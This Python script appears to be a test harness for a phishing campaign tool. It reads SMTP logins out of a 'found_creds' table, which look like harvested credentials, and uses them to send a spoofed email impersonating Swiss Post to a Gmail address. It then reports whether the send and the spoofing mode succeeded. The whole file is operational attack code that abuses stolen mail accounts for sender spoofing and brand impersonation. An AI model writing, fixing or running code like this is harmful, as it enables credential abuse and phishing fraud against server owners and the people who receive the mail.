import sys, sqlite3, traceback, importlib
sys.path.insert(0, '/opt/darkvasend')

# Force reimport
if 'auditguard.campaign_sender' in sys.modules:
    del sys.modules['auditguard.campaign_sender']
if 'auditguard.spoof_engine' in sys.modules:
    del sys.modules['auditguard.spoof_engine']

from auditguard.campaign_sender import _send_one, pick_best_spoof_mode
from auditguard.spoof_templates import get_template

db = sqlite3.connect('/opt/darkvasend/bustgo-hunt.db')
db.row_factory = sqlite3.Row

for sid in [5, 6]:
    r = db.execute('SELECT * FROM found_creds WHERE id=?', (sid,)).fetchone()
    smtp_config = {
        'host': r['smtp_host'],
        'port': r['smtp_port'],
        'username': r['smtp_user'],
        'password': r['smtp_password'],
        'from_email': r['smtp_user'],
    }
    tpl = get_template('swisspost')
    print(f'\n=== V2 FIXED: SMTP #{sid} ({r["smtp_host"]}) ===', flush=True)
    print(f'From: {tpl["from_name"]} <{tpl["from_email"]}>', flush=True)
    print(f'To: numerique.fiscal@gmail.com', flush=True)

    try:
        result = _send_one(
            smtp_config,
            tpl['from_name'],
            tpl['from_email'],  # Full email, no TLD strip
            'numerique.fiscal@gmail.com',
            tpl['subject'],
            tpl['html'],
            '',
            smtp_config.get('from_email', ''),
            tpl.get('reply_to', ''),
            'clean',
            None,
        )
        print(f'SUCCESS: {result["success"]}', flush=True)
        print(f'MODE: {result.get("spoof_mode_used", "?")}', flush=True)
        if result.get('error'):
            print(f'ERROR: {result["error"]}', flush=True)
    except Exception as e:
        print(f'EXCEPTION: {type(e).__name__}: {e}', flush=True)
        traceback.print_exc()

db.close()
